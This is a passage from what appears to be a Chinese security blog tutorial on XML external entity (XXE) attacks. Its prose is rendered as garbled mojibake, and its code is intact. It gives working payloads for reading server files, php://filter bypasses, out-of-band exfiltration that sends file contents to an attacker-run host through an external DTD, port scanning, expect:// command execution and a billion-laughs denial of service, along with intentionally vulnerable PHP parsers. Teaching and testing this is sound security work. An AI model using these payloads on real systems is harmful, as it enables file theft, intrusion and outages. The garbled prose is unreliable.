å®šä¹‰ä¸º CDATAã€‚CDATA éƒ¨åˆ†ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«è§£æå™¨å¿½ç•¥ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210408221117818.png" alt="image-20210408221117818"></p><h2 id="XMLå®ä½“"><a href="#XMLå®ä½“" class="headerlink" title="XMLå®ä½“"></a>XMLå®ä½“</h2><p>é™¤äº†åœ¨ DTD ä¸­å®šä¹‰å…ƒç´ ï¼ˆå…¶å®å°±æ˜¯å¯¹åº” XML ä¸­çš„æ ‡ç­¾ï¼‰ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½åœ¨ DTD ä¸­å®šä¹‰å®ä½“(å¯¹åº”XML æ ‡ç­¾ä¸­çš„å†…å®¹)ã€‚å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚</p><blockquote><p>ç”¨æˆ·å¯è‡ªå®šä¹‰çš„å®ä½“å¯ä»¥åˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“</p><ol><li><p>ä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•ï¼š<!ENTITY å®ä½“å "å®ä½“å†…å®¹"><br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š&amp;å®ä½“åï¼›</p></li><li><p>å‚æ•°å®ä½“<strong>åªèƒ½åœ¨DTDä¸­ä½¿ç”¨</strong>ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š <!ENTITY % å®ä½“å "å®ä½“å†…å®¹"><br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š%å®ä½“å;</p></li></ol></blockquote><p>ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-string">&quot;hello,world&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">&lt;!--å‚æ•°å®ä½“--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">test</span> <span class="meta-string">&quot;&lt;!ENTITY hello &#x27;hello,world&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%test;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;hello;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>å®ä½“ä»å¼•å…¥æ–¹å¼æ¥çœ‹è¿˜å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œå¤–éƒ¨å®ä½“å’Œå†…éƒ¨å®ä½“ã€‚</p><ol><li>å¤–éƒ¨å®ä½“å®šä¹‰éœ€è¦åŠ ä¸Š SYSTEMå…³é”®å­—ï¼Œå…¶å†…å®¹æ˜¯URLæ‰€æŒ‡å‘çš„å¤–éƒ¨æ–‡ä»¶å®é™…çš„å†…å®¹ã€‚</li><li>å¦‚æœä¸åŠ SYSTEMå…³é”®å­—ï¼Œåˆ™ä¸ºå†…éƒ¨å®ä½“ï¼Œè¡¨ç¤ºå®ä½“æŒ‡ä»£å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚</li></ol></blockquote><p>ä¸Šé¢æˆ‘ä»¬ä¸¾çš„ä¾‹å­å°±æ˜¯å†…éƒ¨å®ä½“ï¼Œä½†æ˜¯å®ä½“å®é™…ä¸Šå¯ä»¥ä»å¤–éƒ¨çš„ dtd æ–‡ä»¶ä¸­å¼•ç”¨ã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///D:/test.dtd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¤–éƒ¨å®ä½“<code>&amp;xxe;</code>è¡¨ç¤ºçš„å°±æ˜¯å¼•å…¥çš„<code>test.dtd</code>ä¸­çš„å†…å®¹ã€‚</p><p>è¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°,éå¸¸æ–¹ä¾¿ï¼ˆ<strong>æ–¹ä¾¿æ°¸è¿œæ˜¯å®‰å…¨çš„æ•Œäºº</strong>ï¼‰</p><p>å¼•å…¥å¤–éƒ¨å®ä½“å¯ç”¨çš„ç›¸å…³åè®®ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210112223950560.png"></p><p>æ—¢ç„¶å®ƒèƒ½æŒ‰ç…§è·¯å¾„å¼•å…¥å¤–éƒ¨çš„ <code>dtd </code>æ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½å°†è·¯å¾„æ¢ä¸€æ¢ï¼Œæ¢æˆæ•æ„Ÿæ–‡ä»¶çš„è·¯å¾„ï¼Œç„¶åæŠŠæ•æ„Ÿæ–‡ä»¶è¯»å‡ºæ¥ï¼Ÿ</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = &lt;&lt;&lt;EOF</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///C:/windows/system.ini&quot;</span>&gt; ]&gt; </span><br><span class="line">&lt;test&gt;&amp;xxe;&lt;/test&gt;</span><br><span class="line">EOF;</span><br><span class="line"><span class="variable">$data</span> = simplexml_load_string(<span class="variable">$xml</span>,SimpleXMLElement,LIBXML_NOENT);</span><br><span class="line">print_r(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚å›¾ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210408000828498.png" alt="image-20210408000828498"></p><p>å‡å¦‚ SYSTEM åé¢çš„å†…å®¹å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼Œé‚£ä¹ˆç”¨æˆ·å°±å¯ä»¥éšæ„æ›¿æ¢ä¸ºå…¶ä»–å†…å®¹ï¼Œä»è€Œè¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ï¼ˆfile:///etc/passwd)æˆ–è€…è¿œç¨‹æ–‡ä»¶ï¼ˆ<a href="http://www.baidu.com/abc.txt%EF%BC%89">http://www.baidu.com/abc.txtï¼‰</a></p><h1 id="XXEå‘ç°"><a href="#XXEå‘ç°" class="headerlink" title="XXEå‘ç°"></a>XXEå‘ç°</h1><ol><li><p>é¦–å…ˆå¯»æ‰¾æ¥å—XMLä½œä¸ºè¾“å…¥å†…å®¹çš„æ³¨å…¥ç‚¹ã€‚</p><p>å¯ä»¥é€šè¿‡ä¿®æ”¹HTTPçš„è¯·æ±‚æ–¹æ³•ï¼Œä¿®æ”¹Content-Typeå¤´éƒ¨å­—æ®µç­‰ç­‰æ–¹æ³•ï¼Œç„¶åçœ‹çœ‹åº”ç”¨ç¨‹åºçš„å“åº”ï¼Œçœ‹çœ‹ç¨‹åºæ˜¯å¦è§£æäº†å‘é€çš„xmlå†…å®¹ï¼Œå¦‚æœè§£æäº†, é‚£ä¹ˆåˆ™å¯èƒ½æœ‰XXEæ”»å‡»æ¼æ´ã€‚</p><p>è¿˜å¯ä»¥å°è¯•æ³¨å…¥xmlé¢„å®šä¹‰çš„ä¸€äº›å®ä½“,çœ‹å…¶æ˜¯å¦æŠ¥é”™ï¼Œé€šè¿‡æŠ¥é”™ä¿¡æ¯åˆ¤æ–­ã€‚</p></li><li><p>å¦‚æœç«™ç‚¹è§£æxmlï¼Œå°±å¯ä»¥å°è¯•å¼•ç”¨å®ä½“å’ŒDTD ã€‚</p></li><li><p>å¦‚æœå¯ä»¥å¼•ç”¨å¤–éƒ¨å®ä½“,åˆ™å­˜åœ¨xxeæ¼æ´</p></li></ol><h1 id="XXEåˆ©ç”¨"><a href="#XXEåˆ©ç”¨" class="headerlink" title="XXEåˆ©ç”¨"></a>XXEåˆ©ç”¨</h1><h2 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h2><ol><li>æœ‰å›æ˜¾çš„æƒ…å†µå¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸­çœ‹åˆ°Payloadçš„æ‰§è¡Œç»“æœæˆ–ç°è±¡(å¸¦å†…XMLå¤–éƒ¨å®ä½“(XXE),å³æ”»å‡»è€…å¯ä»¥å‘é€å¸¦æœ‰XXEæœ‰æ•ˆè´Ÿè½½çš„è¯·æ±‚å¹¶ä»åŒ…å«æŸäº›æ•°æ®çš„Webåº”ç”¨ç¨‹åºè·å–å“åº”)</li></ol><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;xxe&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;./xml.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = simplexml_load_string(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line"><span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>è¯»å–æœ¬åœ°æ–‡ä»¶</strong></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/system.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411175855619.png" alt="image-20210411175855619"></p><p>ä½†æ˜¯ï¼Œå½“æ‰€è¯»å–æ–‡ä»¶ä¸­åŒ…å«äº†<code>&lt;</code>æˆ–è€…<code>&amp;</code>ç­‰ä¸€äº›ç‰¹æ®Šç¬¦å·æ—¶ï¼Œä¼šå‘ç°çˆ†äº†ä¸€å †é”™è€Œä¸”è¯»å–ä¸åˆ°è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411180142451.png" alt="image-20210411180142451"></p><p>åŸå› æ˜¯xmlä¼šæŠŠ<code>&lt;</code>ç­‰ç‰¹æ®Šå­—ç¬¦è§£æå¯¼è‡´é”™è¯¯ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¹‹å‰çš„<code>CDATA</code> å’Œå‚æ•°å®ä½“æ¥ç»•è¿‡ã€‚</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///D:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.77.1/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxe.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411221956406.png" alt="image-20210411221956406"></p><p>æ­¤å¤–ï¼Œé’ˆå¯¹è¯»å–æ–‡ä»¶ä¸­å«ç‰¹æ®Šå­—ç¬¦çš„æƒ…å†µå¹¶ä¸”è¯¥ç½‘ç«™æ˜¯phpè¯­è¨€ç¼–å†™çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpçš„ä¸€äº›ä¼ªåè®®è¿›è¡Œè¯»å–ã€‚</p><p>ç”¨åˆ°çš„ä¼ªåè®®ï¼š</p><blockquote><p>php://filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚</p></blockquote><p>å®é™…åˆ©ç”¨ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=D:/test.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411222122278.png" alt="image-20210411222122278"></p><p>base64è§£ç åå¾—åˆ°test.txtä¸­çš„å†…å®¹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411222200953.png" alt="image-20210411222200953"></p><ol start="2"><li>åœ¨å®é™…æƒ…å†µä¸­ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹æœåŠ¡å™¨ä¸Šçš„XMLå¹¶ä¸æ˜¯è¾“å‡ºç”¨çš„ï¼Œæ‰€ä»¥å°±å°‘äº†è¾“å‡ºè¿™ä¸€ç¯èŠ‚ï¼Œè¿™æ ·çš„è¯ï¼Œå³ä½¿æ¼æ´å­˜åœ¨ï¼Œæˆ‘ä»¬çš„payloadçš„ä¹Ÿè¢«è§£æäº†ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰è¾“å‡ºï¼Œæˆ‘ä»¬ä¹Ÿä¸çŸ¥é“è§£æå¾—åˆ°çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œå› æ­¤æˆ‘ä»¬æƒ³è¦ç°å®ä¸­åˆ©ç”¨è¿™ä¸ªæ¼æ´å°±å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªä¸ä¾é å…¶å›æ˜¾çš„æ–¹æ³•â€”â€”å¤–å¸¦æ•°æ®ã€‚</li></ol><p>é€”å¾„ï¼šé€šè¿‡å¤–éƒ¨DTDçš„æ–¹å¼å¯ä»¥å°†å†…éƒ¨å‚æ•°å®ä½“çš„å†…å®¹ä¸å¤–éƒ¨DTDå£°æ˜çš„å®ä½“çš„å†…å®¹æ‹¼æ¥èµ·æ¥ã€‚<br>åˆ©ç”¨payloadæ¥ä»ç›®æ ‡ä¸»æœºè¯»å–åˆ°æ–‡ä»¶å†…å®¹åï¼Œå°†æ–‡ä»¶å†…å®¹ä½œä¸ºurlçš„ä¸€éƒ¨åˆ†æ¥è¯·æ±‚æˆ‘ä»¬æœ¬åœ°ç›‘å¬çš„ç«¯å£ã€‚</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.232.128/a.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>a.dtdæ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.232.128&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æœåŠ¡å™¨æ—¥å¿—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail /var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411235840135.png" alt="image-20210411235840135"></p><p>åŒæ ·ï¼Œbase64è§£ç å¾—test.txtçš„å†…å®¹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210411235716386.png" alt="image-20210411235716386"></p><h2 id="ç«¯å£æ¢æµ‹"><a href="#ç«¯å£æ¢æµ‹" class="headerlink" title="ç«¯å£æ¢æµ‹"></a>ç«¯å£æ¢æµ‹</h2><p>å› ä¸ºæˆ‘ä»¬çš„XMLåœ¨å¼•ç”¨å¤–éƒ¨DTDå’Œå¤–éƒ¨å®ä½“çš„æ—¶å€™æ”¯æŒhttpåè®®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹è¿›è¡Œç«¯å£æ¢æµ‹ã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//ç¦ç”¨/å¯ç”¨åŠ è½½å¤–éƒ¨å®ä½“çš„åŠŸèƒ½</span></span><br><span class="line">    libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.77.1:80&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ˜¯è¯·æ±‚å¼€æ”¾çš„ç«¯å£ï¼Œè¯·æ±‚æ—¶é—´è¾ƒçŸ­ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210413223616203.png" alt="image-20210413223616203"></p><p>è€Œå¦‚æœè¯·æ±‚çš„æ˜¯æœªå¼€æ”¾çš„ç«¯å£ï¼Œåˆ™è¯·æ±‚æ—¶é—´æ˜æ˜¾åŠ é•¿!</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210413223716363.png" alt="image-20210413223716363"></p><p>è¿›ä¸€æ­¥å¯åˆ©ç”¨burpsuiteçš„çˆ†ç ´æ¨¡å—(Intruder)å¯¹æ‰€åœ¨ç½‘æ®µè¿›è¡Œç«¯å£æ¢æµ‹ã€‚</p><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><p>å½“ç›®æ ‡æœºå™¨å®‰è£…å¹¶åŠ è½½äº†PHPçš„expectæ‰©å±•,å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤.(ç”±äºè¿™ä¸ªæ‰©å±•ä¸æ˜¯é»˜è®¤å®‰è£…çš„,æ‰€ä»¥å¾ˆå°‘ç¢°åˆ°!)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [ <span class="meta">&lt;!ELEMENT  <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DOSæ”»å‡»"><a href="#DOSæ”»å‡»" class="headerlink" title="DOSæ”»å‡»"></a>DOSæ”»å‡»</h2><p>åœ¨å®éªŒçš„è¿‡ç¨‹ä¸­å‘ç°,å•ç‹¬ä¸€ä¸ªæ•°æ®åŒ…å¹¶ä¸æ˜æ˜¾,å¯ä»¥ç»“åˆburpsuiteçš„çˆ†ç ´æ¨¡å—ä½¿ç”¨!(å®é™…æµ‹è¯•åˆ‡è®°ä¸è¦å°è¯•)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">     <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol2</span> <span class="meta-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol3</span> <span class="meta-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol4</span> <span class="meta-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span 